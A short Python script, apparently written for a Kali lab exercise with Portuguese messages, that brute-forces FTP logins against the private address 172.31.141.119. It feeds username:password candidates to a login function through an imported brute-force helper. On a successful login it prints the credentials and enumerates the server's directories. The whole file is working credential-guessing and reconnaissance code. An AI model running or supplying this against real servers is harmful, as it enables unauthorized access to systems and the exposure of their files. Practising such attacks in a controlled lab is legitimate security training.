from ftplib import FTP
import brute_force_main

def footpriting(FTP_conection):
    print("Realizando footprintg")
    FTP_conection.pwd()
    FTP_conection.dir()
    print(FTP_conection.nlst())
    FTP_conection.retrlines('LIST')


def try_ftp_login(payload,host):
    NAME,PASS = payload.split(":")
    try:
        ftp = FTP(host,NAME.strip(),PASS.strip())
        print("sucesso")
        print(f"Login: {NAME} Senha:{PASS}")
        footpriting(ftp)
        ftp.quit()
        return True
    except Exception as e:
        pass
    return False

try:
    response = brute_force_main.brute_force(try_ftp_login,"172.31.141.119","^USER:^PASS",login="kali",password="kali")
    if response == True:
        print()
        print("Parabéns você conseguiu!")
        print()
    else:
        print("Tente outro payload")
except KeyboardInterrupt:
    print("O programa foi finalizando")

